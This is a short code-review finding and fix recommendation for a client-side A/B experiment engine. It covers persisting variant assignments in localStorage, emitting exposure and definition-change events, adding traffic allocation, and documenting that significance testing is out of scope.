findings.fix: Persist assignments to localStorage keyed `gf:exp:<experimentId>` with the variant id and a definition hash; on definition change keep the stored variant and emit `guideflow.experiment.definition_changed` rather than silently re-bucketing. Add `ExperimentEngine.setCollector(collector)` (or accept one in the constructor) and emit `guideflow.experiment.exposed` with `experiment_id`/`variant_id` on first `assign()` per experiment per session — never from `peek()`. Add `trafficAllocation?: number` evaluated from an independently salted hash so excluded users return a documented `null`. Document honestly that significance testing is out of scope.
